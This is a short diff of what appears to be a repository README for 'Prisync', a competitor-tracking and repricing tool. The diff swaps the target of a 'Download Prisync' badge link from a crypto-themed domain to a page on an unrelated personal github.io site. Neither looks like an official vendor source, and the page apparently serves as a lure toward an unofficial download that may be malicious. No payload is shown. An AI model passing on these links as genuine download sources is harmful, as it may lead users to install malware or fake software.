@@ -2,7 +2,7 @@
 
 Prisync tracks competitors and automates repricing using SmartPrice rules to protect margins.
 
-[![Download Prisync](https://img.shields.io/badge/Download-Prisync-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Prisync](https://img.shields.io/badge/Download-Prisync-blueviolet)](https://jasonwinslowlvgco.github.io/.github/Prisync-Labs)
 
 ---
 
